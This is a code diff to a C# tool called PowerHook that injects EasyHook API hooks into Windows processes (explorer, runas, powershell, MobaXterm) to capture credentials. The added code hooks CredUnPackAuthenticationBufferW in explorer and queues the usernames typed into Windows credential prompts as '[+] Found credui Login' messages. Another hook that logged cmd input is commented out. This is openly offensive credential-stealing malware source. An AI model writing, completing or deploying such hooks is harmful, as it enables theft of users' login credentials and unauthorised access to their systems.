@@ -121,7 +121,21 @@ namespace PowerHook
 
 
             //Install hooks
-            if (currentProcess == "runas" || currentProcess == "powershell")
+
+
+            if (currentProcess == "explorer")
+            {
+                LoadLibrary("Credui.dll");
+                var CredUnPackAuthenticationBufferW = EasyHook.LocalHook.Create(
+                EasyHook.LocalHook.GetProcAddress("Credui.dll", "CredUnPackAuthenticationBufferW"),
+                new CredUnPackAuthenticationBufferW_Delegate(CredUnPackAuthenticationBufferW_Hook),
+                this);
+
+                // Activate hooks on all threads except the current thread
+                CredUnPackAuthenticationBufferW.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
+            }
+
+             if (currentProcess == "runas" || currentProcess == "powershell")
             {
                 // RunAs hook function
                 LoadLibrary("Advapi32.dll");
@@ -145,10 +159,6 @@ namespace PowerHook
 
                 //Activate hooks on all threads except the current thread
                 createCryptHook.ThreadACL.SetExclusiveACL(new Int32[] { 0 });
-
-
-
-
             }
             
             if (currentProcess == "MobaXterm")
@@ -226,8 +236,50 @@ namespace PowerHook
         }
 
 
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
+        delegate bool CredUnPackAuthenticationBufferW_Delegate(uint dwFlags, out IntPtr pAuthBuffer, uint cbAuthBuffer, [MarshalAs(UnmanagedType.LPWStr)] String pszUserName, ref uint pcchMaxUserName, [MarshalAs(UnmanagedType.LPWStr)] String pszDomainName, ref uint pcchMaxDomainName, [MarshalAs(UnmanagedType.LPWStr)] String pszPassword, ref uint pcchMaxPassword);
+        [DllImport("Credui.dll", EntryPoint = "CredUnPackAuthenticationBufferW", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
+        static extern bool CredUnPackAuthenticationBufferW(uint dwFlags, out IntPtr pAuthBuffer, uint cbAuthBuffer, [MarshalAs(UnmanagedType.LPWStr)] String pszUserName, ref uint pcchMaxUserName, [MarshalAs(UnmanagedType.LPWStr)] String pszDomainName, ref uint pcchMaxDomainName, [MarshalAs(UnmanagedType.LPWStr)] String pszPassword, ref uint pcchMaxPassword);
+
+        bool CredUnPackAuthenticationBufferW_Hook(
+           uint dwFlags, 
+           out IntPtr pAuthBuffer, 
+           uint cbAuthBuffer, 
+           [MarshalAs(UnmanagedType.LPWStr)] String pszUserName, 
+           ref uint pcchMaxUserName, 
+           [MarshalAs(UnmanagedType.LPWStr)] String pszDomainName, 
+           ref uint pcchMaxDomainName, 
+           [MarshalAs(UnmanagedType.LPWStr)] String pszPassword, 
+           ref uint pcchMaxPassword)
+        {
+            try
+            {
+                lock (this._messageQueue)
+                {
+                    if (this._messageQueue.Count < 1000)
+                    {
+                      
+                        String Data = pszUserName;
+
+                        this._messageQueue.Enqueue(
+                        string.Format("[+] Found credui Login --> {0}", Data)); //doesnt work
+
+
+                    }
+                }
+            }
+            catch
+            {
+                // swallow exceptions so that any issues caused by this code do not crash target process
+            }
+            return CredUnPackAuthenticationBufferW(dwFlags, out pAuthBuffer, cbAuthBuffer, pszUserName, ref pcchMaxUserName, pszDomainName,ref pcchMaxDomainName, pszPassword, ref pcchMaxPassword);
+        }
+
+
         //CMD
         [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        
         delegate bool RtlInitUnicodeStringEx_Delegate(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] String SourceString);
 
         [DllImport("ntdll.dll",EntryPoint = "RtlInitUnicodeStringEx", SetLastError = true, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode)]
@@ -245,10 +297,10 @@ namespace PowerHook
                     {
 
 
-                        String Data =  SourceString;
+                        //String Data =  SourceString;
 
-                        this._messageQueue.Enqueue(
-                        string.Format("[+] Found cmd Login --> {0}", Data));
+                        //this._messageQueue.Enqueue(
+                        //string.Format("[+] Found cmd Login --> {0}", Data));
                         
                         
 
